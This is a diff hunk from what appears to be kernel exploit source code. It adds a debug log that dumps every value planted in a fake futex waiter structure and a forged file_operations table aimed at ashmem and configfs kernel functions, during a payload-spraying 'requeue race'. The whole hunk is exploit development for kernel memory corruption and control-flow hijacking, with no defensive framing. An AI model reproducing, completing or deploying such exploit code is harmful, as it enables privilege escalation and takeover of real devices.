@@ -1812,6 +1812,23 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     waiter_prio = SLIDE_FAKE_WAITER_PRIO;
   }
 
+  /* Black-box recorder: dump every planted waiter/fops value before the
+   * kernel ever touches the payload, so a crash during the requeue race
+   * can be attributed to an exact (address,value) pair afterwards. */
+  pr_info("fops payload plant tree_parent=%016zx tree_right=%016zx "
+          "tree_left=%016zx pi_parent=%016zx pi_right=%016zx "
+          "pi_left=%016zx task=%016lx lock=%016zx prio=%u "
+          "group=%016lx pi_top=%016lx fake_fops=%016zx "
+          "fops.llseek=%016zx fops.read_iter=%016zx "
+          "fops.write_iter=%016zx fops.ioctl=%016zx "
+          "fops.compat=%016zx target_ashmem_fops=%016zx\n",
+          (uintptr_t)1, (uintptr_t)0, (uintptr_t)0, write_pc, write_right,
+          write_left, (unsigned long)waiter_task, fake_lock, waiter_prio,
+          (unsigned long)task_group, (unsigned long)pi_top_task, fake_fops,
+          fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF, text_addr(CONFIGFS_READ_ITER),
+          text_addr(CONFIGFS_BIN_WRITE_ITER), text_addr(ASHMEM_IOCTL),
+          text_addr(ASHMEM_COMPAT_IOCTL), data_addr(ASHMEM_MISC_FOPS));
+
   for (size_t chunk = 0;
        chunk + SKB_FRAG_BIAS + ORDER3_SIZE <= SKB_SEND_SIZE;
        chunk += ORDER3_SIZE) {
